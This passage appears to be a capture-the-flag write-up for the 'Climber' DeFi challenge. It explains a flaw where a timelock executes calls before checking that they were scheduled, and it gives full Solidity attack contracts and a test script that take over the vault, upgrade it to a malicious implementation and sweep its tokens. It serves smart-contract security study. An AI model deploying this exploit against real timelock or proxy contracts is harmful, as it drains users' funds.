Now the **ClimberTimelock.sol** contract. There is no obvious entry inside the vault contract so let's look at the owner contract. It looks like it can execute transactions that can be scheduled only by the proposer role. It uses role-based access control and we as attackers don't have any roles. `execute()` is the only function that we can access, it executes a scheduled transaction, but how do we execute anything if we can't schedule it? Well, the vulnerability is actually a common violation of the check-effect-interaction function design. You can notice that `execute()` first executes the transaction and only then it checks if it was scheduled.

We can take advantage of this by getting basically inside the function, running some transactions and the only key is that one of those transactions has to actually schedule all of them. This way we will pass the requirement:

```solidity
require(getOperationState(id) == OperationState.ReadyForExecution);
```

There are a couple of things we need to do in order to pass as well. The delay for the transaction from being scheduled to be executed must be 0, we can set it using the `updateDelay()` function. For calling the `schedule()` we need a proposer role so we have to grant ourselves that role using `grantRole()`. This is possible because the timelock contract will call itself, msg.sender will actually be the **ClimberTimelock.sol** which has an owner role granted by itself in the constructor.

Now the exact steps for the exploit are following. First, we will make a new **ClimberAttack.sol** contract. We will set up all necessary calls inside it. Firstly we update the delay to 0 and grant us the proposer role. After that, we transfer ownership of the vault to us and schedule all calls so the transaction goes through. This way we are the owner of the vault. Now we can upgrade the implementation logic of the proxy to a new malicious vault. For that, we will create our **VaultUpgradedAttack.sol** contract. Since there is no way to grant ourselves the sweeper role, we can just set the `sweepFunds` modifier to the `onlyOwner` and that will allow us to call it. After carefully matching state variables with proxy, we just need to add an empty `_authorizeUpgrade()` function because override is required for virtual functions.

Solution code:

**ClimberAttack.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IClimberTimelock {
    function execute(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external payable;

    function schedule(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external;
}

contract ClimberAttack {
    address[] private targets;
    uint256[] private values;
    bytes[] private dataElements;
    bytes32 private salt;
    IClimberTimelock private timelock;
    address private vault;
    address private attacker;

    constructor(address _timelock, address _vault, address _attacker) {
        timelock = IClimberTimelock(_timelock);
        vault = _vault;
        attacker = _attacker;
    }

    function attack() external {
        targets.push(address(timelock));
        values.push(0);
        dataElements.push(
            abi.encodeWithSignature("updateDelay(uint64)", uint64(0))
        );

        targets.push(address(timelock));
        values.push(0);
        dataElements.push(
            abi.encodeWithSignature(
                "grantRole(bytes32,address)",
                keccak256("PROPOSER_ROLE"),
                address(this)
            )
        );

        targets.push(address(vault));
        values.push(0);
        dataElements.push(
            abi.encodeWithSignature("transferOwnership(address)", attacker)
        );

        targets.push(address(this));
        values.push(0);
        dataElements.push(abi.encodeWithSignature("schedule()"));

        salt = keccak256("SALT");

        timelock.execute(targets, values, dataElements, salt);
    }

    function schedule() public {
        timelock.schedule(targets, values, dataElements, salt);
    }
}
```

**VaultUpgradedAttack.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract VaultUpgradedAttack is
    Initializable,
    OwnableUpgradeable,
    UUPSUpgradeable
{
    uint256 public constant WITHDRAWAL_LIMIT = 1 ether;
    uint256 public constant WAITING_PERIOD = 15 days;

    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;

    function initialize() external initializer {
        __Ownable_init();
        __UUPSUpgradeable_init();
    }

    function sweepFunds(address tokenAddress) external onlyOwner {
        IERC20 token = IERC20(tokenAddress);
        require(
            token.transfer(msg.sender, token.balanceOf(address(this))),
            "Failed transfer"
        );
    }

    function _authorizeUpgrade(
        address newImplementation
    ) internal override onlyOwner {}
}
```

**climber.challenge.js**

```js
it('Exploit', async function () {
  /** CODE YOUR EXPLOIT HERE */
  const VaultUpgradedAttackFactory = await ethers.getContractFactory(
    'VaultUpgradedAttack',
    attacker
  );
  const ClimberAttackFactory = await ethers.getContractFactory(
    'ClimberAttack',
    attacker
  );
  const climberAttackContract = await ClimberAttackFactory.deploy(
    this.timelock.address,
    this.vault.address,
    attacker.address
  );

  await climberAttackContract.connect(attacker).attack();
  const compromisedVault = await upgrades.upgradeProxy(
    this.vault.address,
    VaultUpgradedAttackFactory
  );
  await compromisedVault.connect(attacker).sweepFunds(this.token.address);
});
```
